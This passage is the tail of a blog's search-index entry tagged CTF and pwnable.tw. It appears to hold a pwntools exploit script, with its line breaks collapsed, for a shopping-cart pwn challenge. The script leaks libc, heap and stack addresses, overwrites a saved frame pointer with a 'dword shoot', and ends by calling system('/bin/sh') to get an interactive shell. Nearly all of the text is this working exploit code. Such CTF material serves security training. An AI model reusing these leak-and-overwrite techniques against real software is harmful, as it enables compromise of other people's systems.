0last_phone = 0xdeadbeefleak = 'y'leak = flat(num,read_got,price,next_phone,last_phone)print len(leak),' : ', leakp.sendline('4')p.recvuntil('Let me check your cart. ok? (y/n) &gt;')p.sendline(leak)p.recvuntil('27: ')read_libc_addr = u32(p.recv(4))if read_libc_addr &gt; 0xf7000000: log.success('got read addr:'+hex(read_libc_addr))system_libc = libc.symbols['system']bin_sh_libc = next(libc.search('/bin/sh'))read_libc = libc.symbols['read']system_libc_addr = system_libc + read_libc_addr - read_libcbin_sh_libc_addr = bin_sh_libc + read_libc_addr - read_libc#leakheap#gdb.attach(p,'b *0x8048b03')p.recvuntil('&gt;')num = 'y\0'read_got = 0x804b070price = 0next_phone = 0last_phone = 0xdeadbeefleak = 'y'leak = flat(num,read_got,price,next_phone,last_phone)print len(leak),' : ', leakp.sendline('4')p.recvuntil('Let me check your cart. ok? (y/n) &gt;')p.sendline(leak)p.recvuntil('27: ')heap_addr = u32(p.recv(4))print '[+]heap: ',hex(heap_addr)#leak_stackstack_p = log.progress('pass')for i in range(26): p.recvuntil('&gt;') num = 'y\0' read_got = heap_addr+8 price = 0 next_phone = 0 last_phone = 0xdeadbeef leak = 'y' leak = flat(num,read_got,price,next_phone,last_phone) print len(leak),' : ', leak p.sendline('4') p.recvuntil('Let me check your cart. ok? (y/n) &gt;') p.sendline(leak) p.recvuntil('27: ') heap_addr = u32(p.recv(4)) print '[+]stack: ',hex(heap_addr) stack_p.status('stack' + hex(heap_addr))stack_addr = heap_addrp.success('find stack addr:'+hex(stack_addr))#dword shootebp_addr = stack_addr + 0x20 + 0x40num = '27'dword_shoot_exp = flat(num,0,0,stack_addr+64,ebp_addr-8)print len(dword_shoot_exp),":",dword_shoot_expp.recvuntil('&gt;')p.sendline('3')p.recvuntil('Number&gt;')#gdb.attach(p)p.sendline(dword_shoot_exp)'''#put system into stackp.recvuntil('&gt;')'''#exitnum = '6\0'esp = 0xdeadbeefexp = flat(num,esp,system_libc_addr,esp,bin_sh_libc_addr)p.recvuntil('&gt;')p.sendline(exp)p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
</search>
